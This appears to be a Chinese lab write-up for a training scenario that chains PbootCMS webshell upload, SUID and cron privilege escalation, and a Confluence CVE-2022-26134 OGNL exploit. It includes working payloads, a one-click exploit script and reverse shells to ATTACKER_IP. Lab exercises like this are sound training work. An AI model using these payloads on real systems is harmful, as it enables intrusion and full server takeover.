# A-Scenario 漏洞复现手册

> **场景 A：区域IPTV内容编排平台渗透**  
> **环境状态：✅ 已验证 (2026-05-21)**  
> **工具：Yakit / Burp Suite**  

---

## 一、环境拓扑

```
┌─────────────────────────────────────────────────────────┐
│                      A-Scenario                          │
│                                                         │
│  ┌──────────────────┐      内网        ┌────────────────┐│
│  │   VM-A1 (DMZ)    │ 192.168.100.0  │  VM-A2 (Internal)││
│  │                  │◄──────────────►│                  ││
│  │ Nginx :80        │   允许:        │ MySQL :3306      ││
│  │  ├─ / → :8080    │   3306/6379/   │  ├─ cms 库       ││
│  │  ├─ /backup/     │   8090         │  ├─ publish_config││
│  │  └─ /media/→5000 │                │  └─ ops_notes    ││
│  │                  │   禁止:        │ Redis :6379      ││
│  │ Apache :8080     │   SSH(22)      │ Confluence :8090 ││
│  │  └─ IPTV编排系统 │                │  └─ CVE-2022-    ││
│  │                  │                │     26134        ││
│  │ Flask :5000      │                │ Cron(10min) root ││
│  │  └─ media-api    │                │  └─ health_check ││
│  │                  │                │     .sh (777)    ││
│  │ SUID: /usr/bin/  │                │                  ││
│  │  find            │                │                  ││
│  └──────────────────┘                └──────────────────┘│
│                                                         │
│  IP: 192.168.100.1                  IP: 192.168.100.2   │
└─────────────────────────────────────────────────────────┘
```

---

## 二、攻击链总览

| 编号 | 攻击链 | 目标 | 类型 | 分值 |
|------|--------|------|------|------|
| A-1 | 备份目录泄露→SQL凭据提取 | A1 | 信息收集 | 50 |
| A-2 | PbootCMS后台登录 | A1 | 认证利用 | 100 |
| A-3 | UEditor文件上传→WebShell | A1 | RCE | 250 |
| A-4 | SUID find提权 | A1 | 提权 | 100 |
| A-5 | Confluence CVE-2022-26134 | A2 | RCE | 300 |
| A-6 | Cron计划任务提权 | A2 | 提权 | 250 |

---

## 三、信息收集阶段

### 3.1 端口扫描

```bash
nmap -sV -p- 192.168.100.1
```

预期结果：
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 (Ubuntu)
80/tcp open  http    nginx 1.18.0
```

### 3.2 目录发现 → 备份文件泄露 (A-1)

**Apache Indexes 功能开启了自动目录列表**，访问以下路径可列出文件：

```
http://192.168.100.1/static/backup/sql/
```

**Yakit 操作 — Web Fuzzer：**

```http
GET /static/backup/sql/ HTTP/1.1
Host: 192.168.100.1
Accept: text/html
Connection: close


```

**目录列表内容：**
```
cms_20240101.sql            # 数据库备份（含账号密码明文注释）
cms_20240101.sql.gz         # 同上（gzip压缩）
publish_notes_202405.txt    # 播控发布配置备忘
media_api_config.example.bak # API配置示例
pbootcms_v324.sql           # 系统初始化SQL
```

### 3.3 下载并分析 SQL 备份

```http
GET /static/backup/sql/cms_20240101.sql HTTP/1.1
Host: 192.168.100.1
Connection: close


```

**文件末尾明文凭据（直接可见）：**

```sql
-- 运营账号: operator / Operator@Media2024 (内容运营员)
-- 管理员账号: admin / Admin@Cms2024 (超级管理员)
-- 数据库连接: cmsuser / Cm5Us3r@2024! @ 192.168.100.2:3306
```

**从SQL中提取的完整账号表：**

| 用户名 | 密码 | 角色 | 密码哈希 (MD5²) |
|--------|------|------|-----------------|
| admin | Admin@Cms2024 | 超级管理员 | f0916d59b2d497402968dbdd3641ddbe |
| operator | Operator@Media2024 | 内容运营员 | dd50ad190a36ac0b8a8c5018a1752a79 |
| editor | Editor@123456 | 内容审核员 | bc21fcad528a604ab1a98c0aa105345e |

> **哈希算法：** PbootCMS 使用 `md5(md5($password))` 双重MD5。Python 验证：
> ```python
> import hashlib
> print(hashlib.md5(hashlib.md5(b'Admin@Cms2024').hexdigest().encode()).hexdigest())
> # f0916d59b2d497402968dbdd3641ddbe ✓
> ```

### 3.4 分析业务线索文件

**publish_notes_202405.txt：**
```
内网服务依赖:
  - 数据库: 192.168.100.2:3306 (cms库)
  - 缓存: 192.168.100.2:6379
  - 知识库: http://192.168.100.2:8090

运营人员账号:
  operator / Operator@Media2024 (内容运营)
```

**media_api_config.example.bak（部分配置）：**
```ini
[INTERNAL]
db_host = 192.168.100.2
db_user = cmsuser
db_pass = ********
```

**关键发现：** 存在内网主机 `192.168.100.2`，运行 MySQL(3306)、Redis(6379)、知识库(8090)。

### 3.5 Media API 信息探测

```http
GET /media/status HTTP/1.1
Host: 192.168.100.1
Connection: close


```

预期响应：
```json
{
  "service": "media-api",
  "status": "running",
  "storage": "/var/www/cms/uploads",
  "media_count": 0
}
```

---

## 四、攻击链 A-2：PbootCMS 后台登录

### 4.1 入口

```
http://192.168.100.1/admin.php
```

### 4.2 使用管理员账号登录

```http
POST /admin.php?p=/Index/login HTTP/1.1
Host: 192.168.100.1
Content-Type: application/x-www-form-urlencoded
Cookie: PbootSystem=任意值; admin_ecode_pbe=任意值

username=admin&password=Admin%40Cms2024&checkcode=验证码&formcheck=CSRF_TOKEN
```

**Yakit 登录流程：**

1. **Step 1：获取 Session 和验证码**
   ```http
   GET /admin.php HTTP/1.1
   Host: 192.168.100.1
   ```
   从响应中提取：
   - `Set-Cookie` 中的 `PbootSystem`（PHP Session）
   - 验证码图片：`GET /admin.php?p=/Index/code`
   - `formcheck` 隐藏字段值

2. **Step 2：发送登录请求**
   ```http
   POST /admin.php?p=/Index/login HTTP/1.1
   Host: 192.168.100.1
   Content-Type: application/x-www-form-urlencoded
   Cookie: PbootSystem=<SESSION_ID>

   username=admin&password=Admin%40Cms2024&checkcode=<验证码>&formcheck=<TOKEN>
   ```

3. **成功响应：**
   ```json
   {"code":1,"data":"/admin.php?p=/Index/home","message":"登录成功"}
   ```

> **建议使用 admin（超级管理员）：** UEditor 上传接口需要已认证的 Session，admin 拥有全部权限。

---

## 五、攻击链 A-3：UEditor 文件上传 → WebShell

### 5.1 漏洞分析

**关键文件：** `core/extend/ueditor/php/config.json`

```json
{
  "imageAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".pht", ".phtml"],
  "videoAllowFiles": [".pht", ".phtml", ...],
  "fileAllowFiles":  [".pht", ".phtml", ".shtml", ".stm", ...]
}
```

**所有三类上传的白名单均包含 `.pht` 和 `.phtml`**。Apache 默认将 `.phtml` 作为 PHP 执行。

**安全控制：** `controller.php` 第 11 行有 `if (! session('sid')) { die('权限不足'); }` — 需要已认证的后台 Session。

### 5.2 漏洞利用 (Yakit)

**Step 1：构造 multipart 上传请求**

```http
POST /core/extend/ueditor/php/controller.php?action=uploadimage HTTP/1.1
Host: 192.168.100.1
Cookie: PbootSystem=<ADMIN_SESSION_ID>
Content-Type: multipart/form-data; boundary=----YakitBoundary

------YakitBoundary
Content-Disposition: form-data; name="upfile"; filename="shell.phtml"
Content-Type: image/png

<?php @eval($_POST['cmd']);?>
------YakitBoundary--
```

**关键参数：**

| 参数 | 值 | 说明 |
|------|-----|------|
| `action` | `uploadimage` | 图片上传接口（也可用 `uploadfile`） |
| `upfile` | 表单字段名 | config.json 中 `imageFieldName` 值 |
| `filename` | `*.phtml` | 必须使用白名单扩展名 |
| Content-Type | `image/png` | 伪装为图片 |

**Step 2：成功响应**

```json
{
  "state": "SUCCESS",
  "url": "/static/upload/image/20240101/1704067200XXXXXX.phtml",
  "title": "1704067200XXXXXX.phtml",
  "original": "shell.phtml",
  "type": ".phtml",
  "size": 30
}
```

> **为什么用 `uploadimage` 而非 `uploadfile`？**
> 图片水印函数只对 `.jpg/.png/.gif` 执行，`.phtml` 文件不会被缩放/水印处理破坏。

### 5.3 验证 WebShell

```http
POST /static/upload/image/20240101/1704067200XXXXXX.phtml HTTP/1.1
Host: 192.168.100.1
Content-Type: application/x-www-form-urlencoded

cmd=system('id');
```

预期响应：
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5.4 获取交互式 Shell

```bash
# 攻击机监听
nc -lvnp 4444

# 通过 WebShell POST 执行反弹命令
cmd=system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
```

### 5.5 一键复现脚本

```bash
#!/bin/bash
TARGET="192.168.100.1"

# Step 1: 获取登录页面和 formcheck token
echo "[*] 获取登录页面..."
RESP=$(curl -s -c /tmp/a_cookie.txt -b /tmp/a_cookie.txt \
  "http://$TARGET/admin.php")
TOKEN=$(echo "$RESP" | grep -oP 'name="formcheck".*?value="\K[^"]+')
echo "[+] formcheck: $TOKEN"

# Step 2: 登录 (验证码需手动输入)
echo "[*] 请输入验证码 (访问 http://$TARGET/admin.php?p=/Index/code):"
read -p "验证码: " CODE

LOGIN=$(curl -s -c /tmp/a_cookie.txt -b /tmp/a_cookie.txt \
  -X POST "http://$TARGET/admin.php?p=/Index/login" \
  -d "username=admin&password=Admin%40Cms2024&formcheck=$TOKEN&checkcode=$CODE")
echo "[+] 登录响应: $LOGIN"

# Step 3: 创建 webshell 文件
echo '<?php system($_GET["cmd"]); ?>' > /tmp/s.phtml

# Step 4: 上传
UPLOAD=$(curl -s -b /tmp/a_cookie.txt \
  -F "upfile=@/tmp/s.phtml;filename=s.phtml;type=image/png" \
  "http://$TARGET/core/extend/ueditor/php/controller.php?action=uploadimage")
echo "[+] 上传响应: $UPLOAD"

# Step 5: 提取 URL 并执行命令
SHELL_URL=$(echo "$UPLOAD" | python3 -c "import sys,json;print(json.load(sys.stdin)['url'])")
echo "[+] WebShell: http://$TARGET$SHELL_URL"
curl -s "http://$TARGET$SHELL_URL?cmd=id"
```

---

## 六、攻击链 A-4：SUID find 提权 → VM-A1 Root

### 6.1 漏洞确认

VM-A1 预置了 `/usr/bin/find` 的 SUID 位（`chmod u+s /usr/bin/find`），任何用户可通过 `find -exec` 以 root euid 执行命令。

```bash
# 在 WebShell 中执行
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 314160 Jan  1  2024 /usr/bin/find
```

### 6.2 利用

```bash
# 方式一：获取 root shell（推荐）
/usr/bin/find . -exec /bin/bash -p \; -quit

# 方式二：创建 SUID bash（持久化）
/usr/bin/find /tmp -name tmp -exec chmod u+s /bin/bash \; -quit 2>/dev/null
/bin/bash -p

# 方式三：一行命令执行
/usr/bin/find . -exec /bin/sh -c 'id; cat /root/mysql_root_reminder.txt' \; -quit
```

**`-p` 参数** 告诉 bash 保留 euid（effective user ID），因为 find 以 root euid 运行，子进程也获得 root 权限。

### 6.3 提取 A1 敏感文件

```bash
# 运维交接记录 — 含 A2 全部凭据和访问方式
cat /opt/ops/access.txt
```

```
===== 播控运维交接记录 =====
日期: 2024-01-15
值班人: 值班工程师

内网支撑服务 (VM-A2) 访问方式:
  IP: 192.168.100.2
  SSH运维: operator / 0p3rat0r@GDJ
  数据库: 192.168.100.2:3306 (root / R00t@Mysql#2024)
  缓存: 192.168.100.2:6379
  知识库: http://192.168.100.2:8090

提示: 知识库管理员账户与SSH运维密码一致，用于查阅播控发布技术文档。
```

```bash
# 同步日志 — 内网服务拓扑信息
cat /opt/ops/publish_sync_202405.log

# MySQL root 密码备忘
cat /root/mysql_root_reminder.txt
# R00t@Mysql#2024 @ 192.168.100.2:3306
```

### 6.4 验证 A2 连通性

```bash
# A2 iptables 规则：允许 3306/6379/8090，阻止 22
nc -zv 192.168.100.2 3306   # MySQL → 成功
nc -zv 192.168.100.2 6379   # Redis → 成功
nc -zv 192.168.100.2 8090   # Confluence → 成功
nc -zv 192.168.100.2 22     # SSH → 超时（DROP）
```

---

## 七、攻击链 A-5：Confluence CVE-2022-26134 → VM-A2 Shell

### 7.1 漏洞分析

| 项目 | 详情 |
|------|------|
| CVE | CVE-2022-26134 |
| 类型 | OGNL 注入（未授权 RCE） |
| 影响版本 | Confluence Server/Data Center 1.3.0 - 7.18.0 |
| 当前版本 | Confluence 7.13.6 |
| 利用条件 | 无需认证，HTTP 直接访问 |

**原理：** Confluence 对 URL 中的 OGNL 表达式过滤不严，攻击者可构造编码后的 OGNL 表达式实现任意命令执行。

### 7.2 漏洞验证（无回显 → 响应头回显）

```http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: 192.168.100.2:8090
Accept: */*
Connection: close


```

**预期响应（关注响应头）：**
```
HTTP/1.1 302 Found
X-Cmd-Response: uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> **注意：** 必须从 `192.168.100.1` 发送请求（或通过 A1 跳板），因为 A2 iptables 只允许 A1 访问 8090 端口。

### 7.3 OGNL Payload 详解

URL 解码后的核心 OGNL 表达式：
```
${(#a=@org.apache.commons.io.IOUtils@toString(
  @java.lang.Runtime@getRuntime().exec("id").getInputStream(),
  "utf-8"))
.(@com.opensymphony.webwork.ServletActionContext@getResponse()
  .setHeader("X-Cmd-Response",#a))}
```

**替换命令：** 修改 `exec("id")` 中的 `id` 为任意命令。

### 7.4 在 Yakit 中执行

**Yakit Web Fuzzer 操作：**

1. 新建 HTTP 请求
2. 粘贴上面的原始数据包
3. 发送请求
4. 在响应头中查看 `X-Cmd-Response` 字段

**修改命令示例：**

```bash
# 查看用户
exec("whoami")

# 读取文件
exec("cat /etc/passwd")

# 查看配置
exec("cat /var/atlassian/confluence/confluence.cfg.xml")
```

### 7.5 获取反向 Shell

**注意：** A2 可能无法直接路由到攻击机。首选方案是从 A1 做监听。

**方案一：A1 做跳板（推荐）**

```bash
# 在 A1 shell 中监听
nc -lvnp 5555

# 通过 A1 发送 Confluence 利用请求（反弹到 A1）
curl -s "http://192.168.100.2:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.100.1/5555%200%3E%261%27%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
```

**方案二：写入 SSH Key**

```bash
# 通过 A1 的 curl 执行（URL 编码后的命令）
# 生成 key
ssh-keygen -t rsa -f /tmp/confluence_key -N ""

# 写入 authorized_keys
curl -s "http://192.168.100.2:8090/%24%7B...exec("mkdir -p /home/confluence/.ssh && echo 'ssh-rsa AAAA...' >> /home/confluence/.ssh/authorized_keys")...%7D/"
```

### 7.6 从 Confluence Shell 收集信息

```bash
# 确认当前用户
id
# uid=1001(confluence) gid=1001(confluence)

# 发现提权线索
ls -la /opt/confluence_health_check.sh
# -rwxrwxrwx 1 root root 185 May 20 02:00 /opt/confluence_health_check.sh

cat /opt/confluence_health_check.sh
# #!/bin/bash
# # 播控知识库服务健康检查 — 由计划任务定时执行
# systemctl status confluence > /dev/null 2>&1 || systemctl restart confluence

cat /etc/cron.d/confluence-health
# */10 * * * * root /opt/confluence_health_check.sh
```

**关键发现：**
- 脚本权限 `777`（所有人可写）
- Cron 以 `root` 身份每 10 分钟执行
- **任何人修改该脚本后，cron 将以 root 权限执行**

### 7.7 通过 MySQL 获取额外信息

```bash
# 从 A1 或 A2 连接 MySQL
mysql -h 192.168.100.2 -u cmsuser -p'Cm5Us3r@2024!' cms

# 运维记录
SELECT * FROM ops_notes;
# 含 health_check.sh 描述、Redis 配置、operator 权限说明

# 内网资产
SELECT * FROM internal_assets;

# 播控配置
SELECT * FROM publish_config;
# 含 confluence_health_check 脚本路径确认
```

---

## 八、攻击链 A-6：Cron 计划任务提权 → VM-A2 Root

### 8.1 漏洞分析

| 组件 | 状态 |
|------|------|
| 脚本路径 | `/opt/confluence_health_check.sh` |
| 脚本权限 | `-rwxrwxrwx` (777) |
| Cron 文件 | `/etc/cron.d/confluence-health` |
| Cron 规则 | `*/10 * * * * root /opt/confluence_health_check.sh` |
| 执行用户 | root |
| 执行间隔 | 10 分钟 |

**利用逻辑：** 任何用户可写入该脚本 → cron 以 root 身份执行 → 获得 root 权限。

### 8.2 提权方法

**方法一：创建 SUID bash（推荐，隐蔽持久）**

```bash
# 在 confluence shell 中执行
cat > /opt/confluence_health_check.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
# 保留原功能避免运维发现
systemctl status confluence > /dev/null 2>&1 || systemctl restart confluence
EOF

chmod 777 /opt/confluence_health_check.sh

# 等待最多 10 分钟，或手动计算 cron 下次执行时间
# 然后执行提权后的 bash
/bin/bash -p
id
# uid=1001(confluence) gid=1001(confluence) euid=0(root)
```

**方法二：反弹 root shell**

```bash
# 在攻击机（或 A1）监听
nc -lvnp 6666

# 在 confluence shell 中写入 payload
cat > /opt/confluence_health_check.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.1/6666 0>&1
EOF

chmod 777 /opt/confluence_health_check.sh
# 等待 cron 执行 → 获得 root@A2 shell
```

**方法三：Python 反向 shell（更稳定）**

```bash
cat > /opt/confluence_health_check.sh << 'EOF'
#!/bin/bash
python3 -c 'import socket,subprocess,os; \
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
s.connect(("192.168.100.1",6666)); \
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
subprocess.call(["/bin/bash","-i"])'
EOF
chmod 777 /opt/confluence_health_check.sh
```

### 8.3 加速触发

如果不想等 10 分钟，可以尝试：

```bash
# 查看 cron 日志确认 cron 服务运行正常
grep -i cron /var/log/syslog | tail -5

# 如果 operator 用户有 sudo（在 A2 上有 NOPASSWD 权限）
sudo /opt/confluence_health_check.sh
# (operator 有 apt/systemctl/service 的 sudo 权限，但没有直接执行脚本的权限)

# 最佳方案：等待 cron（最多 10 分钟）
```

### 8.4 验证 Root

```bash
# 方案一验证
/bin/bash -p
id
# uid=0(root) gid=0(root) groups=0(root)

# 读取 root 目录
ls -la /root/
cat /root/flag.txt 2>/dev/null
```

---

## 九、完整攻击链流程图

```
外部攻击者
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ A-1: /static/backup/sql/ 目录遍历                        │
│   → cms_20240101.sql 备份下载                            │
│   → 明文凭据: admin/Admin@Cms2024                        │
│   → 明文凭据: operator/Operator@Media2024                │
│   → 内网信息: 192.168.100.2 (MySQL/Redis/Confluence)     │
└──────────────────────────┬──────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────┐
│ A-2: /admin.php 后台登录                                  │
│   → admin / Admin@Cms2024 (超级管理员)                    │
│   → 获取认证 Session (PbootSystem Cookie)                │
└──────────────────────────┬──────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────┐
│ A-3: UEditor .phtml 上传 → WebShell                      │
│   → POST /core/extend/ueditor/php/controller.php         │
│     ?action=uploadimage                                  │
│   → filename="shell.phtml"                               │
│   → www-data shell @ VM-A1                               │
└──────────────────────────┬──────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────┐
│ A-4: SUID find 提权 → Root @ A1                          │
│   → /usr/bin/find . -exec /bin/bash -p \;                │
│   → cat /opt/ops/access.txt → A2完整凭据                  │
│   → cat /root/mysql_root_reminder.txt → MySQL root       │
└──────────────────────────┬──────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────┐
│ A-5: Confluence CVE-2022-26134 (从A1跳板)                │
│   → OGNL注入: ${...Runtime.getRuntime().exec("id")...}   │
│   → confluence shell @ VM-A2                             │
│   → 发现: /opt/confluence_health_check.sh (777)          │
│   → 发现: cron root 每10分钟执行该脚本                     │
└──────────────────────────┬──────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────┐
│ A-6: Cron 脚本劫持 → Root @ A2                           │
│   → echo "chmod u+s /bin/bash" > health_check.sh         │
│   → 等待 ≤10 分钟                                         │
│   → /bin/bash -p → root @ VM-A2                          │
└─────────────────────────────────────────────────────────┘
```

---

## 十、Yakit 完整操作指南

### 10.1 信息收集

1. **端口扫描：** `Yakit → 端口扫描` → `192.168.100.1` → `1-65535`
2. **爬虫：** `Yakit → 网站扫描` → URL `http://192.168.100.1/`
3. **目录爆破：** `Yakit → Web Fuzzer` → 常用字典

### 10.2 SQL 备份下载

在 `Web Fuzzer` → 新建请求：
```http
GET /static/backup/sql/cms_20240101.sql HTTP/1.1
Host: 192.168.100.1
```
在响应中滚动到底部查看凭据注释。

### 10.3 PbootCMS 登录

1. 浏览器打开 `http://192.168.100.1/admin.php`
2. Yakit 开启 `MITM 代理` 抓包
3. 输入 `admin / Admin@Cms2024` + 手动输入验证码
4. 记录 `Set-Cookie: PbootSystem=xxx` 用于后续请求

### 10.4 UEditor 上传

在 `Web Fuzzer` → 新建请求：

1. **Method：** `POST`
2. **URL：** `http://192.168.100.1/core/extend/ueditor/php/controller.php?action=uploadimage`
3. **Header：** `Cookie: PbootSystem=<SESSION_ID>`
4. **Body Type：** `multipart/form-data`
5. **添加字段：** `upfile` (类型 file)，文件名 `shell.phtml`，内容 `<?php system($_GET['cmd']);?>`
6. 发送，从 JSON 响应的 `url` 字段获取 WebShell 路径

### 10.5 Confluence CVE-2022-26134

**前提：** 需要通过 A1 作为跳板发起（A2 8090 仅对 A1 开放）

**方式一 — Yakit + 爬虫A1：**

1. 在 Yakit `Web Fuzzer` 粘贴第九章中的完整 Confluence Payload
2. Host 设为 `192.168.100.2:8090`
3. 如果直连不通，在 A1 WebShell 中通过 `curl` 执行

**方式二 — A1 WebShell 中 curl：**

```bash
# 在 WebShell 中执行
http://192.168.100.1/static/upload/image/xxxxx.phtml?cmd=curl%20-s%20%27http://192.168.100.2:8090/OGNL_PAYLOAD%27
```

---

## 十一、附录

### A. 凭据汇总

| 服务 | 地址 | 用户名 | 密码 | 来源 |
|------|------|--------|------|------|
| PbootCMS 后台 | http://192.168.100.1/admin.php | admin | Admin@Cms2024 | SQL备份 |
| PbootCMS 后台 | http://192.168.100.1/admin.php | operator | Operator@Media2024 | SQL备份 |
| MySQL | 192.168.100.2:3306 | root | R00t@Mysql#2024 | access.txt |
| MySQL | 192.168.100.2:3306 | cmsuser | Cm5Us3r@2024! | SQL备份 |
| SSH (A1) | 192.168.100.1:22 | operator | 0p3rat0r@GDJ | access.txt |
| SSH (A2) | 192.168.100.2:22 | operator | 0p3rat0r@GDJ | access.txt |
| Confluence | http://192.168.100.2:8090 | operator | 0p3rat0r@GDJ | access.txt |
| Redis | 192.168.100.2:6379 | — | 无密码 | iptables/探测 |

### B. 关键文件路径

| 路径 | 用途 | 获取方式 |
|------|------|----------|
| `/var/www/cms/static/backup/sql/cms_20240101.sql` | 数据库备份(凭据) | Web: `/static/backup/sql/` |
| `/var/www/cms/static/backup/sql/publish_notes_202405.txt` | 播控备忘 | Web: 同上 |
| `/var/www/cms/core/extend/ueditor/php/config.json` | UEditor白名单 | Web路径 |
| `/opt/ops/access.txt` | A2完整凭据 | A1 Shell |
| `/opt/ops/publish_sync_202405.log` | 内网拓扑日志 | A1 Shell |
| `/root/mysql_root_reminder.txt` | MySQL root密码 | A1 Root |
| `/opt/confluence_health_check.sh` | Cron提权入口(777) | A2 Shell |
| `/etc/cron.d/confluence-health` | Cron配置 | A2 Shell |

### C. PbootCMS 密码哈希

```python
import hashlib

def pbootcms_hash(password: str) -> str:
    """PbootCMS 3.2.x 使用双重 MD5"""
    return hashlib.md5(
        hashlib.md5(password.encode()).hexdigest().encode()
    ).hexdigest()

# 验证
assert pbootcms_hash("Admin@Cms2024")      == "f0916d59b2d497402968dbdd3641ddbe"
assert pbootcms_hash("Operator@Media2024") == "dd50ad190a36ac0b8a8c5018a1752a79"
assert pbootcms_hash("Editor@123456")      == "bc21fcad528a604ab1a98c0aa105345e"
print("All hashes verified ✓")
```

### D. 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| UEditor 返回 "权限不足" | Session过期 | 重新登录获取Cookie |
| `.phtml` 不解析为PHP | Apache handler配置 | 检查 `/etc/apache2/mods-enabled/php*.conf` |
| Confluence 8090 无响应 | iptables限制 | 必须从A1(192.168.100.1)发起 |
| SSH A2 超时 | iptables DROP 22端口 | 通过Confluence进入 |
| Cron不触发 | 系统时间/服务状态 | `systemctl status cron`检查 |
| 备份目录403而不是列表 | Nginx配置位置问题 | 尝试 `/static/backup/sql/` |
